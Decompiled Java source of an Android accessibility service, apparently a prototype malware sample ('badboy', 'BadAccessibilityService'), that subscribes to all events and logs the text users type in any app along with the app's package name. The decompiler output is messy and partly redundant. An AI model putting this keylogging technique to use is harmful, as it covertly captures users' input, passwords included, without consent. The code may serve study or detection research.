package com.prototype.badboy;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.Metadata;
import kotlin.collections.CollectionsKt;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes3.dex */
@Metadata(d1 = "\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0003\u0008\u0007\u0018\u00002\u00020\u0001B\u0007¢\u0006\u0004\u0008\u0002\u0010\u0003J\u0012\u0010\u0004\u001a\u00020\u00052\u0008\u0010\u0006\u001a\u0004\u0018\u00010\u0007H\u0016J\u0008\u0010\u0008\u001a\u00020\u0005H\u0016J\u0008\u0010\t\u001a\u00020\u0005H\u0014¨\u0006\n", d2 = {"Lcom/prototype/badboy/BadAccessibilityService;", "Landroid/accessibilityservice/AccessibilityService;", "<init>", "()V", "onAccessibilityEvent", "", "event", "Landroid/view/accessibility/AccessibilityEvent;", "onInterrupt", "onServiceConnected", "app_debug"}, k = 1, mv = {2, 0, 0}, xi = 48)
public final class BadAccessibilityService extends AccessibilityService {

    public static final int $stable;
    static {
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Object obj;
        int i;
        AccessibilityNodeInfo source;
        int joinToString$default;
        Object str3;
        int string;
        String str2;
        Object string2;
        String str;
        int i2;
        int i4;
        int i3;
        int i5;
        int i8;
        int i6;
        int i7;
        obj = event;
        i = 0;
        StringBuilder stringBuilder = new StringBuilder();
        str3 = "BadAccessibility";
        Log.d(str3, stringBuilder.append("Event: ").append(obj.getEventType()).append(" - ").append(obj.getPackageName()).toString());
        if (event != null && obj.getEventType() == 16) {
            obj = event;
            i = 0;
            stringBuilder = new StringBuilder();
            str3 = "BadAccessibility";
            Log.d(str3, stringBuilder.append("Event: ").append(obj.getEventType()).append(" - ").append(obj.getPackageName()).toString());
            if (obj.getEventType() == 16) {
                java.util.List text = obj.getText();
                Intrinsics.checkNotNullExpressionValue(text, "getText(...)");
                StringBuilder stringBuilder2 = new StringBuilder();
                Log.d(str3, stringBuilder2.append("Text changed: ").append(CollectionsKt.joinToString$default((Iterable)text, (CharSequence)"", 0, 0, 0, 0, 0, 62, 0)).toString());
            }
            source = obj.getSource();
            str3 = source;
            string = 0;
            string2 = str3.getText();
            if (source != null && string2 != null) {
                str3 = source;
                string = 0;
                string2 = str3.getText();
                if (string2 != null) {
                    string2 = string2.toString();
                    if (string2 == null) {
                    } else {
                        str2 = string2;
                    }
                }
                str3.recycle();
            }
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        Log.d("BadAccessibility", "Service interrupted");
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        final AccessibilityServiceInfo service = accessibilityServiceInfo;
        final int i = 0;
        service.eventTypes = -1;
        service.feedbackType = 16;
        service.flags = 88;
        service.notificationTimeout = 100;
        setServiceInfo(accessibilityServiceInfo);
    }
}
